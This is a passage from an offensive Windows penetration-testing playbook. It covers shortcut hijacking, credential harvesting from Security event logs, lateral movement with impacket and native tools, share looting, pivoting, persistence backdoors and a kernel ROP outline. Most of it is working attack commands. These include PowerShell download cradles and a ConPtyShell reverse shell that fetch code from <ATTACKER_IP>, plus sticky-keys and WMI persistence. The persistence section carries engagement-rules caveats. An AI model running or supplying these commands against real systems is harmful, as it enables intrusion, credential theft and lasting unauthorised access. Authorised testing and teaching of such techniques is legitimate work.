printf '\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' | dd of=<REPAIRED_FILE> bs=1 count=8 conv=notrunc

# === Verify repair ===
file <REPAIRED_FILE>            # should now identify correctly
unzip -l <REPAIRED_FILE>       # for ZIP-based (OOXML) — list contents

# === Additional ZIP repair (if central directory is damaged) ===
zip -FF <CORRUPTED_FILE> --out <REPAIRED_FILE>.zip
unzip -t <REPAIRED_FILE>.zip   # test integrity
```

```powershell
# === Windows equivalent — PowerShell byte patching ===
$bytes = [System.IO.File]::ReadAllBytes('C:\path\to\<CORRUPTED_FILE>')
# Patch ZIP/OOXML magic bytes
$bytes[0] = 0x50; $bytes[1] = 0x4B; $bytes[2] = 0x03; $bytes[3] = 0x04
[System.IO.File]::WriteAllBytes('C:\path\to\<REPAIRED_FILE>', $bytes)

# Verify
[System.Text.Encoding]::ASCII.GetString($bytes[0..3])  # should show 'PK..'
```

#### Living-off-the-land / LOTL variant

```bash
# printf + dd are standard coreutils — fully native on any Linux/macOS
# On Windows: PowerShell byte array manipulation as shown above (no tools needed)
```

### 4.28n Writable .lnk Shortcut Hijack for Lateral User-Context Execution

When a shared directory (Public Desktop, department share, StartMenu) contains `.lnk` shortcuts that other users click, overwriting the shortcut target executes code as that user on their next click.

```powershell
# === Find writable .lnk files in shared locations ===
# Public Desktop (all users see these shortcuts)
Get-ChildItem 'C:\Users\Public\Desktop' -Filter *.lnk -Force
icacls 'C:\Users\Public\Desktop'

# Shared network folders commonly hosting .lnk
Get-ChildItem '\\<FILE_SERVER>\<SHARE>' -Filter *.lnk -ErrorAction SilentlyContinue

# Check if current user can modify the .lnk
icacls 'C:\Users\Public\Desktop\<TARGET>.lnk'
# Need (M), (W), or (F) permission
```

```powershell
# === Create malicious .lnk (WScript.Shell COM) ===
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut('C:\Users\Public\Desktop\<TARGET>.lnk')
$lnk.TargetPath = 'C:\Windows\System32\cmd.exe'
$lnk.Arguments = '/c C:\Windows\Temp\payload.exe'
$lnk.IconLocation = 'C:\Windows\System32\shell32.dll,3'  # folder icon to look legitimate
$lnk.WorkingDirectory = 'C:\Windows\Temp'
$lnk.Save()

# Or point to PowerShell download cradle
$lnk.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
$lnk.Arguments = '-nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')"'
$lnk.IconLocation = 'C:\Program Files\<ORIGINAL_APP>\app.exe,0'  # preserve original icon
$lnk.Save()
```

```cmd
:: === Alternative: overwrite existing .lnk target via binary edit ===
:: .lnk files are binary format but TargetPath is plaintext at a known offset
:: Safest to recreate via COM as above rather than binary-patching
```

#### Living-off-the-land / LOTL variant

```powershell
# WScript.Shell COM is native PowerShell — no tools needed
# If PowerShell is blocked, use VBScript:
```

```vbs
' Save as hijack.vbs, run with cscript //nologo hijack.vbs
Set sh = CreateObject("WScript.Shell")
Set lnk = sh.CreateShortcut("C:\Users\Public\Desktop\<TARGET>.lnk")
lnk.TargetPath = "C:\Windows\System32\cmd.exe"
lnk.Arguments = "/c C:\Windows\Temp\payload.exe"
lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
lnk.Save
```

### 4.29 Event Log Readers Group Abuse — Non-Admin Credential Access via Security Log

Members of the builtin `Event Log Readers` group (SID `S-1-5-32-573`) can read the Security log without local admin. When the host has Process Creation auditing with command-line capture enabled (Event 4688 + `ProcessCommandLineAuditing`), credentials passed on the command line (`/p:`, `-Password`, `net use ... /user:`, scheduled-task wrappers, scripts run by other users) leak into the log as cleartext.

```powershell
# === Confirm group membership ===
whoami /groups | findstr /i "S-1-5-32-573 Event"
net localgroup "Event Log Readers"
# Domain-wide enumeration for users in this group on a target host:
Get-LocalGroupMember -Group "Event Log Readers"
```

```powershell
# === Read Security log locally (no admin needed if in Event Log Readers) ===
# Native PowerShell — survives Constrained Language Mode
Get-WinEvent -LogName Security -MaxEvents 5000 |
  Where-Object { $_.Id -eq 4688 } |
  Select-Object -ExpandProperty Message |
  Select-String -Pattern '/p:|/pass:|-Password |--password=|ConvertTo-SecureString|net use .*\\\\.* /user:'

# wevtutil — text export for grepping
wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text /c:5000 > C:\Windows\Tasks\sec.txt
findstr /i /c:"/p:" /c:"/pass:" /c:"-Password " /c:"/user:" C:\Windows\Tasks\sec.txt

# Targeted hunt — interactive logons by a specific account often expose its password
# in the parent process command line of a scheduled task or runas wrapper
Get-WinEvent -LogName Security -FilterHashtable @{Id=4688} -MaxEvents 10000 |
  Where-Object { $_.Message -match '<TARGET_USER>' } |
  Format-List TimeCreated, Message
```

```powershell
# === Read Security log REMOTELY from attacker host ===
# Requires Event Log Readers on the TARGET; no local logon needed.
$cred = Get-Credential <DOMAIN>\<USER>
Get-WinEvent -ComputerName <TARGET> -Credential $cred -LogName Security -FilterHashtable @{Id=4688} -MaxEvents 5000 |
  Where-Object { $_.Message -match '/p:|-Password |/user:' } |
  Select-Object TimeCreated, @{n='cmd';e={($_.Message -split "`n" | Select-String 'Process Command Line').Line}}

# wevtutil remote (cmd.exe-friendly under CLM)
wevtutil qe Security /r:<TARGET> /u:<USER> /p:<PASSWORD> /q:"*[System[(EventID=4688)]]" /f:text /c:5000 > sec.txt
```

> **OPSEC:** Reading the Security log via WinRM emits Event 4624 type 3 + WinRM Operational entries. The remote read itself does not generate a 4688 — only the act of authenticating shows up.

```powershell
# === Other logs the same group can read (often richer pickings) ===
# PowerShell 4104 ScriptBlock — script content with embedded secrets
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterHashtable @{Id=4104} -MaxEvents 5000 |
  Select-Object -ExpandProperty Message |
  Select-String -Pattern 'password|secret|apikey|connectionstring|ConvertTo-SecureString' -Context 0,2

# Sysmon (if installed) — Event 1 ProcessCreate carries CommandLine without needing 4688 audit policy
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterHashtable @{Id=1} -MaxEvents 5000 |
  Where-Object { $_.Message -match '/p:|-Password |/user:' } |
  Format-List TimeCreated, Message

# List every channel readable by current token
wevtutil el | findstr /i "powershell sysmon security"
```

```powershell
# === Pivot with recovered creds ===
# 🟡 WinRM session establishment from a non-admin source = EID 4624 logon-type 3 + WinRM/Operational EID 91; volumetric if you Enter-PSSession through every host — fingerprintable lateral pattern
$pass = ConvertTo-SecureString '<RECOVERED_PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<RECOVERED_USER>', $pass)
Enter-PSSession -ComputerName <TARGET> -Credential $cred
# Or if Kerberos double-hop blocks the pivot:
Enter-PSSession -ComputerName <TARGET> -Credential $cred -Authentication CredSSP
```

> **Tip:** Other low-privilege builtin groups worth checking on every box — `Backup Operators` (full registry/SAM read, see [active-directory-methodology.md §8.4](active-directory-methodology.md)), `Performance Log Users`, `Distributed COM Users`, `Remote Management Users`. Always run `whoami /groups` and pivot off any non-default SID.

> **LOTL caveat:** `wevtutil` and `Get-WinEvent` are signed Microsoft binaries used by sysadmins constantly — neither is AV/EDR-flagged on its own. The IOC is the *volume* of Security-log reads in a short window; pace queries with `-MaxEvents` and channel-specific filters rather than dumping the full log.

---

## Phase 5: Lateral Movement

**Goal:** Move to other machines in the network using obtained credentials or hashes.

> **Prerequisite:** most methods in 5.1 require local admin creds, an NT hash, or a Kerberos ticket on the *target*. If you only have a low-priv shell, return to Phase 4 (credential extraction from 4.7/4.17) first.

### 5.1 Remote Execution Methods

| Method | Port | Requires Local Admin | Tool |
|---|---|---|---|
| **WinRM** | 5985/5986 | Yes | `evil-winrm` |
| **PsExec** | 445 | Yes | `impacket-psexec` |
| **WMIExec** | 135 | Yes | `impacket-wmiexec` |
| **SMBExec** | 445 | Yes | `impacket-smbexec` |
| **ATExec** | 445 | Yes | `impacket-atexec` |
| **DCOM** | 135 | Yes | `impacket-dcomexec` |
| **RDP** | 3389 | RDP group | `xfreerdp` |

```bash
# WinRM — Pass-the-Hash (lateral-movement context; standard auth case is in enumeration-methodology.md §3.16 WinRM)
evil-winrm -i <IP> -u '<USER>' -H '<NT_HASH>'

# PsExec (drops to SYSTEM)
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<IP>
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes :<NT_HASH>

# WMIExec (no service creation, stealthier)
impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<IP>

# SMBExec
impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<IP>

# DCOM
impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<IP>

# ATExec (scheduled task-based, stealthy)
impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<IP> "whoami"

# RDP
xfreerdp /v:<IP> /u:'<USER>' /p:'<PASSWORD>' /cert:ignore +clipboard /dynamic-resolution

# RDP — Pass the Hash (requires Restricted Admin mode enabled)
xfreerdp /v:<IP> /u:'<USER>' /pth:'<NT_HASH>' /cert:ignore

# Enable Restricted Admin mode on target (requires admin on target first)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### 5.2 Pass-the-Hash
```bash
# Use NT hash directly — no cracking needed
netexec smb <IP> -u '<USER>' -H '<NT_HASH>'
evil-winrm -i <IP> -u '<USER>' -H '<NT_HASH>'
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes :<NT_HASH>
```

### 5.3 PowerShell Remoting (From Windows)
```powershell
# If you have a shell on a Windows host and need to move laterally

# Enter interactive session
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USER>

# Execute command on remote host
Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { whoami }

# Execute on multiple hosts
Invoke-Command -ComputerName <TARGET1>,<TARGET2> -Credential $cred -ScriptBlock { hostname }

# Build credential object
$secpasswd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $secpasswd)
Enter-PSSession -ComputerName <TARGET> -Credential $cred
```

### 5.4 RDP Hijacking (Requires SYSTEM)
```powershell
# List active sessions
query user

# Hijack another user's RDP session without their password
tscon <SESSION_ID> /dest:rdp-tcp#<YOUR_SESSION>
# Must run as SYSTEM — use PsExec: psexec -s cmd.exe
# Or use sc to create a service: sc create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:rdp-tcp#<YOUR_SESSION>"
# sc start sesshijack
```

### 5.4b Native Lateral Movement (No Impacket / No Linux Tools)
When you only have a Windows shell and can't use impacket or evil-winrm:
```powershell
# === WMI REMOTE EXECUTION (native, no tools) ===
# Requires: admin creds on target, TCP 135 open
wmic /node:<TARGET_IP> /user:<DOMAIN>\<USER> /password:<PASSWORD> process call create "cmd.exe /c whoami > C:\temp\output.txt"

# PowerShell WMI:
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', (ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force))
Invoke-WmiMethod -ComputerName <TARGET_IP> -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt"

# === SCHEDULED TASK REMOTE EXECUTION (native) ===
# Requires: admin creds on target, TCP 445 open
# Marker-named, single-fire, delete immediately — not persistence.
schtasks /create /s <TARGET_IP> /u <DOMAIN>\<USER> /p <PASSWORD> /tn "engagement-test-<TS>" /tr "cmd.exe /c whoami > C:\Windows\Temp\engagement-test-<TS>.txt" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s <TARGET_IP> /u <DOMAIN>\<USER> /p <PASSWORD> /tn "engagement-test-<TS>"
schtasks /delete /s <TARGET_IP> /u <DOMAIN>\<USER> /p <PASSWORD> /tn "engagement-test-<TS>" /f

# === SC REMOTE SERVICE CREATION (native) ===
# Requires: admin creds on target, TCP 445 open
# Marker-named, transient — delete immediately after firing.
sc \\<TARGET_IP> create engagement-test-<TS> binpath= "cmd.exe /c whoami > C:\Windows\Temp\engagement-test-<TS>.txt" start= demand
sc \\<TARGET_IP> start engagement-test-<TS>
sc \\<TARGET_IP> delete engagement-test-<TS>

# === POWERSHELL REMOTING (native) ===
# Requires: WinRM enabled on target (TCP 5985)
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', (ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force))
Invoke-Command -ComputerName <TARGET_IP> -Credential $cred -ScriptBlock { whoami }
Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred

# === NET USE + COPY (native file transfer to remote host) ===
net use \\<TARGET_IP>\C$ /user:<DOMAIN>\<USER> <PASSWORD>
copy C:\temp\payload.exe \\<TARGET_IP>\C$\temp\payload.exe
# Then execute via WMI/schtasks/sc above
net use \\<TARGET_IP>\C$ /delete

# === WINRS (native WinRM client — cmd.exe alternative to Enter-PSSession) ===
winrs -r:<TARGET_IP> -u:<DOMAIN>\<USER> -p:<PASSWORD> "whoami"
winrs -r:<TARGET_IP> -u:<DOMAIN>\<USER> -p:<PASSWORD> cmd.exe
```

### 5.5 File Exfiltration During Lateral Movement
```bash
# Grab files from remote shares with valid creds
netexec smb <IP> -u '<USER>' -p '<PASSWORD>' --shares
smbclient //<IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>' -c 'recurse ON; prompt OFF; mget *'

# Download specific file
smbclient //<IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASSWORD>' -c 'get path\to\file.txt'

# Spider shares for interesting files (passwords, configs, scripts)
netexec smb <IP> -u '<USER>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true
```

### 5.5b Looted Binary / Installer / Script Credential Extraction

After mass-grabbing a share, triage the loot for hardcoded credentials in compiled binaries and installer payloads — not just text configs. Migration, tester, deploy, and one-off harness binaries are credential goldmines.

```bash
# After mget/spider — sweep loot dir for interesting file types
find ./share_loot/ -type f \( -iname '*.exe' -o -iname '*.dll' -o -iname '*.msi' -o -iname '*.bat' -o -iname '*.ps1' -o -iname '*.psm1' -o -iname '*.psd1' -o -iname '*.vbs' -o -iname '*.config' -o -iname '*.xml' -o -iname '*.ini' -o -iname '*.kdbx' -o -iname '*.rdg' -o -iname '*.jar' \) -print

# Names that historically leak prod creds — engineers hardcode and forget
find ./share_loot/ \( -iname '*test*' -o -iname '*tester*' -o -iname '*migration*' -o -iname '*backup*' -o -iname '*deploy*' -o -iname '*setup*' -o -iname '*install*' -o -iname '*config*' -o -iname 'web.config' -o -iname 'app.config' -o -iname 'connections.xml' \)
```

```bash
# strings over every looted binary — ASCII + UTF-16LE (Windows wide strings) + UTF-16BE
for f in $(find ./share_loot/ -type f \( -iname '*.exe' -o -iname '*.dll' -o -iname '*.msi' \)); do
  echo "=== $f ==="
  { strings -a -n 8 "$f"; strings -a -e l -n 8 "$f"; strings -a -e b -n 8 "$f"; } \
    | grep -iE 'pass|pwd|passwd|secret|apikey|token|user=|uid=|connectionstring|server=|driver=|database=|https?://' \
    | sort -u | head -30
done

# Single binary, all encodings explicitly
strings -a    ./share_loot/<APP_PATH>/<binary>.exe | grep -iE 'pass|pwd'   # ASCII
strings -a -e l ./share_loot/<APP_PATH>/<binary>.exe | grep -iE 'pass|pwd' # UTF-16LE
strings -a -e b ./share_loot/<APP_PATH>/<binary>.exe | grep -iE 'pass|pwd' # UTF-16BE
```

```bash
# .NET decompile — ILSpy / dnSpy / dotPeek — embedded creds often in resource strings
# https://github.com/icsharpcode/ILSpy
ilspycmd -p ./share_loot/<APP_PATH>/<binary>.exe > <binary>.decompiled.cs
grep -iE 'password|pwd|secret|connectionstring|apikey|bearer' <binary>.decompiled.cs

# Java — jadx / cfr
# https://github.com/skylot/jadx
jadx -d ./jadx_out ./share_loot/<APP_PATH>/<binary>.jar
grep -riE 'password|pwd|secret|apikey' ./jadx_out/

# Java JAR — extended triage (without full decompile)
unzip -l ./share_loot/<APP_PATH>/<binary>.jar | grep -iE '\.properties|\.yml|\.yaml|\.xml|\.conf'
unzip -p ./share_loot/<APP_PATH>/<binary>.jar "*.properties" | grep -iE 'password|pwd|secret|datasource|jdbc|user'
unzip -p ./share_loot/<APP_PATH>/<binary>.jar "application.yml" 2>/dev/null | grep -iE 'password|secret|key'
unzip -p ./share_loot/<APP_PATH>/<binary>.jar "META-INF/MANIFEST.MF"  # shows Main-Class, entry point

# Single .class file decompile (javap for method signatures, cfr for full source)
unzip ./share_loot/<APP_PATH>/<binary>.jar -d ./jar_extracted/
javap -p ./jar_extracted/com/company/<CLASS>.class   # method signatures + field names
# cfr (https://github.com/leibnitz27/cfr):
java -jar cfr.jar ./jar_extracted/com/company/<CLASS>.class | grep -iE 'pass|secret|token'

# Credential-reuse pivot after extraction
netexec smb <TARGET> -u '<EXTRACTED_USER>' -p '<EXTRACTED_PASS>'
impacket-mssqlclient '<EXTRACTED_USER>':'<EXTRACTED_PASS>'@<TARGET> -windows-auth

# MSI installer payload extraction
msiextract ./share_loot/<APP_PATH>/installer.msi -C ./msi_extracted/
strings -a ./msi_extracted/* | grep -iE 'pass|pwd|secret|connectionstring'

# PyInstaller-bundled EXE — extract .pyc and decompile to Python source
# Identify PyInstaller binary (strings reveals _MEIPASS, PYZ markers)
strings -a ./share_loot/<APP_PATH>/<binary>.exe | grep -iE 'MEIPASS\|PYZ\|pyinstaller\|Py_Initialize'
# pyinstxtractor — extracts all bundled .pyc files + PYZ archive
# https://github.com/extremecoders-re/pyinstxtractor
python3 pyinstxtractor.py ./share_loot/<APP_PATH>/<binary>.exe
# Output: <binary>.exe_extracted/ with .pyc files + PYZ-00.pyz_extracted/
ls ./<binary>.exe_extracted/
# Main script is usually the .pyc with the same name as the EXE (no _pycache prefix)

# Decompile .pyc to readable Python source
# pycdc (https://github.com/zrax/pycdc) — works for Python 3.6-3.12
pycdc ./<binary>.exe_extracted/<MAIN_SCRIPT>.pyc > decompiled.py
# uncompyle6 (Python <=3.8 only): uncompyle6 -o . <file>.pyc
# decompyle3 (Python 3.7-3.9): decompyle3 <file>.pyc
# pylingual (https://pylingual.io) — web-based, handles Python 3.9-3.12 where others fail

# Grep decompiled source for credentials
grep -iE 'password|passwd|pwd|secret|api.key|token|conn.*string|ldap|smtp|ftp' decompiled.py

# Credential-reuse pivot
netexec smb <TARGET> -u '<USER>' -p '<EXTRACTED_PASS>'
```

```bash
# Text-file sweep — scripts/configs/INI/XML inside the loot
grep -riE 'password\s*=|pwd\s*=|passwd\s*=|secret\s*=|apikey|connectionstring|server=.*uid=|<add\s+key' ./share_loot/ 2>/dev/null

# PowerShell modules / DSC configs — inline creds, PSCredential blobs, ConvertTo-SecureString -AsPlainText
grep -riE 'ConvertTo-SecureString|PSCredential|-Password|-Credential' ./share_loot/ --include='*.ps1' --include='*.psm1' --include='*.psd1'
```

```powershell
# On-target equivalent if egress is blocked — Sysinternals strings.exe (uploadable LOLBin)
C:\Tools\strings.exe -a -nobanner <APP_PATH>\<binary>.exe | findstr /I /R "pass pwd secret connectionstring server= uid="

# PowerShell-only fallback — Select-String over share content
Get-ChildItem -Recurse -Include *.exe,*.dll,*.config,*.xml,*.ini,*.bat,*.ps1 \\<TARGET>\<SHARE>\ |
  ForEach-Object {
    $m = Select-String -Path $_.FullName -Pattern 'password|pwd|secret|connectionstring|user=|uid=' -AllMatches -SimpleMatch -ErrorAction SilentlyContinue
    if ($m) { Write-Host "=== $($_.FullName) ===" -ForegroundColor Yellow; $m | Select-Object -First 5 }
  }
```

> **Tip:** Folders named `_Migration`, `zz_Migration`, `_Archive`, `New folder`, and binaries like `tester.exe`, `dbtest.exe`, `migrate.exe` are credential goldmines — engineers hardcode prod creds for one-off tooling and forget them on the share. Always triage these before pivoting elsewhere.

> See also: [active-directory-methodology.md](active-directory-methodology.md) §2.6 Snaffler for automated share-wide credential hunting; §4.7 above for `findstr /si connectionstring` over local config files.

---

### 5.6 Pivoting from Windows
```powershell
# netsh port forwarding (built-in, no tools needed)
netsh interface portproxy add v4tov4 listenport=<LOCAL_PORT> listenaddress=0.0.0.0 connectport=<REMOTE_PORT> connectaddress=<INTERNAL_TARGET>
netsh interface portproxy show all

# Open firewall for the forwarded port
netsh advfirewall firewall add rule name="Pivot" dir=in action=allow protocol=tcp localport=<LOCAL_PORT>
```
> For full pivoting techniques (Chisel, Ligolo-ng, SSH tunnels), see [tunneling-pivoting.md](tunneling-pivoting.md).

### 5.7 Shell Upgrade & Stabilization
```powershell
# From a basic cmd.exe shell → PowerShell
powershell -ep bypass

# Fully interactive shell via ConPtyShell (best option)
# Attacker: stty raw -echo; (stty size; cat) | nc -lvnp <PORT>
# Target:
IEX(IWR http://<ATTACKER_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <ATTACKER_IP> -RemotePort <PORT>

# rlwrap for readline support on dumb shells
# Attacker: rlwrap nc -lvnp <PORT>

# Upgrade WinRM shell to full interactive (evil-winrm already provides this)
evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD>'
# evil-winrm supports: upload/download, .NET assembly loading, PowerShell modules
```

---

## Phase 6: Persistence (If Required)

**Goal:** Maintain access across reboots.

> **🛑 Engagement RoE Check — Persistence is restricted by default**
>
> Persistence primitives below should fire ONLY when the engagement explicitly validates persistence (Purple Team detection-engineering, red-team RoE that requests persistence simulation). For all other work — bug-bounty PoC, vendor coordinated disclosure, standard pentest — use the **additive-only marker convention** instead:
>
> - **Don't:** create a new Run key, scheduled task, service, cron job, .bashrc append, systemd unit, or WMI subscription as proof you got SYSTEM/root.
> - **Do:** drop a uniquely-named marker file in a location only that privilege can write (`C:\Users\Administrator\marker-engagement-<engagement-id>-<ts>.txt`, `C:\Windows\System32\marker-engagement-<engagement-id>-<ts>.txt`). The location proves the privilege; the file is removable; no persistent execution.
>
> When persistence IS validated by the engagement scope, follow the rules below:
> - Use a **marker name** (e.g. `Run` key value `engagement-test-<ts>`, scheduled task `engagement-validation-<ts>`, WMI filter `engagement-test-<ts>`).
> - Make it **easily removable** — no obfuscated names, no encrypted bodies.
> - **Coordinate** with the detection team before firing (so they can confirm telemetry).
> - **Remove at end of engagement** — track in your cleanup checklist (see `pentest-process.md` Phase 6 cleanup).
>
> Reference: User's offsec engagement rules §5 (additive-only proof-of-access).

### 6.1 Common Persistence Mechanisms
```powershell
# === REGISTRY RUN KEYS (native) ===
# Marker-named for engagement validation only — coordinate with detection team and remove at end of engagement.
# Current user (no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v engagement-test-<TS> /t REG_SZ /d "C:\Windows\Temp\engagement-test-<TS>.exe"
# All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v engagement-test-<TS> /t REG_SZ /d "C:\Windows\Temp\engagement-test-<TS>.exe"
# RunOnce (executes once then deletes itself)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v engagement-test-<TS> /t REG_SZ /d "C:\Windows\Temp\engagement-test-<TS>.exe"

# === SCHEDULED TASK (native) ===
# Marker-named for engagement validation only.
schtasks /create /tn "engagement-test-<TS>" /tr "C:\Windows\Temp\engagement-test-<TS>.exe" /sc onlogon /ru SYSTEM
# With specific time
schtasks /create /tn "engagement-test-<TS>" /tr "C:\Windows\Temp\engagement-test-<TS>.exe" /sc daily /st 09:00 /ru SYSTEM

# === NEW LOCAL ADMIN USER (native) ===
# Use a marker username (e.g., engagement-test-<TS>) — never reuse a real account name and remove at end of engagement.
net user engagement-test-<TS> <PASSWORD> /add
net localgroup Administrators engagement-test-<TS> /add
# Hide from login screen (requires admin):
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v engagement-test-<TS> /t REG_DWORD /d 0 /f

# === ENABLE RDP (native) ===
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="engagement-test-<TS>-RDP" dir=in action=allow protocol=tcp localport=3389

# === STICKY KEYS / ACCESSIBILITY BACKDOOR (native — works at login screen) ===
# WARNING: this MODIFIES system binaries — out of bounds for additive-only proof. Only fire if engagement explicitly validates this technique.
# Replace sethc.exe (Sticky Keys) with cmd.exe
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
# At RDP login screen → press Shift 5 times → SYSTEM shell

# Or replace utilman.exe (Ease of Access)
copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# At RDP login screen → click Ease of Access → SYSTEM shell

# === WMI EVENT SUBSCRIPTION (stealthy, survives reboots) ===
# Marker-named for engagement validation only.
# PowerShell native:
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "engagement-test-<TS>-Filter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "engagement-test-<TS>-Consumer"
    CommandLineTemplate = "C:\Windows\Temp\engagement-test-<TS>.exe"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# === STARTUP FOLDER (native, no admin for current user) ===
copy C:\Windows\Temp\engagement-test-<TS>.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\engagement-test-<TS>.exe"
# All users (requires admin):
copy C:\Windows\Temp\engagement-test-<TS>.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\engagement-test-<TS>.exe"
```

### 6.2 MOF File Auto-Compilation Attack (Legacy: XP / Server 2003)

On Windows XP and Server 2003, the WMI service auto-compiles any `.mof` file dropped into `C:\Windows\System32\wbem\mof\`. This provides SYSTEM code execution if you have write access to that directory. Primarily relevant for legacy targets (MS10-061, wbemexec).

```bash
# Generate malicious MOF on attacker (creates a WMI event subscription)
# Template that executes a command as SYSTEM when compiled:
cat << 'EOF' > evil.mof
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter {
    EventNamespace = "Root\\Cimv2";
    Name  = "engagement-test-<TS>";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200";
    QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer {
    Name = "engagement-test-<TS>";
    ScriptingEngine = "VBScript";
    ScriptText = "Set objShell = CreateObject(\"Wscript.Shell\")\nobjShell.Run \"cmd.exe /c net user engagement-test-<TS> <PASSWORD> /add && net localgroup Administrators engagement-test-<TS> /add\"";
};
instance of __FilterToConsumerBinding {
    Consumer = $Consumer;
    Filter = $EventFilter;
};
EOF
```

```cmd
:: Deploy to target (requires writable C:\Windows\System32\wbem\mof\)
:: This path is only auto-compiled on XP/2003 — later OS require mofcomp.exe
copy evil.mof C:\Windows\System32\wbem\mof\evil.mof
:: WMI auto-compiles within 60 seconds → event subscription fires → SYSTEM exec

:: On Server 2008+ — manual compilation (requires admin)
mofcomp.exe C:\Windows\Temp\evil.mof
```

#### Living-off-the-land / LOTL variant

```cmd
:: mofcomp.exe is a native Windows binary (LOLBin)
:: Auto-compilation in wbem\mof\ directory is XP/2003 only
:: On modern OS, mofcomp.exe requires admin but is fully native
mofcomp.exe C:\Windows\Temp\evil.mof
```

### 6.3 Windows Kernel ROP — kASLR Bypass + SMEP Bypass (Advanced Exploit Dev)

> **Scope note:** This is advanced kernel exploit development, far beyond CPTS exam scope. Included for completeness when encountering custom kernel driver exploitation (see 4.21c-2).

```bash
# === kASLR bypass via leaked ntoskrnl base (requires info-leak primitive) ===
# Method 1: NtQuerySystemInformation(SystemModuleInformation) — user-mode call returns
# base addresses of all loaded kernel modules including ntoskrnl.exe
# Available to medium-IL processes (standard user) on Win7/8; restricted on Win10 1607+

# Method 2: MSR LSTAR read (IA32_LSTAR at MSR 0xC0000082 stores KiSystemCall64 address)
# Requires kernel read primitive (e.g., via vulnerable driver IOCTL)
# KiSystemCall64 offset from ntoskrnl base is fixed per build → leak base
```

```bash
# === Gadget hunting with ropper (on attacker box) ===
# Extract ntoskrnl.exe from target (same build/patch level)
# Pull from: C:\Windows\System32\ntoskrnl.exe (via SeBackupPrivilege or admin share)
ropper --file ntoskrnl.exe --type rop | grep -E "mov cr4|pop rcx|wbinvd|ret"

# Key gadgets for SMEP bypass:
# pop rcx; ret              → load controlled value into RCX
# mov cr4, rcx; ret         → clear CR4.SMEP bit (bit 20) → allows user-mode code exec in ring 0
# Alternative: PTE U/S bit flip via MiGetPteAddress
ropper --file ntoskrnl.exe --search "mov rax, cr3"
```

```c
/* === Minimal exploit skeleton (pseudo-code) ===
   1. Leak ntoskrnl base (info leak primitive)
   2. Calculate gadget addresses: base + offset
   3. Build ROP chain on stack: pop rcx; ret → (cr4_value_with_smep_cleared) → mov cr4, rcx; ret → shellcode_addr
   4. Trigger stack pivot via vulnerable driver IOCTL
   5. Shellcode: steal SYSTEM token, assign to current process
*/
// This requires a working kernel write-what-where or stack overflow in a driver
// Compile: x86_64-w64-mingw32-gcc kernel_exploit.c -o kernel_exploit.exe -static
```

#### Living-off-the-land / LOTL variant

```powershell
# No LOTL equivalent — kernel exploit development requires compiled C/ASM.
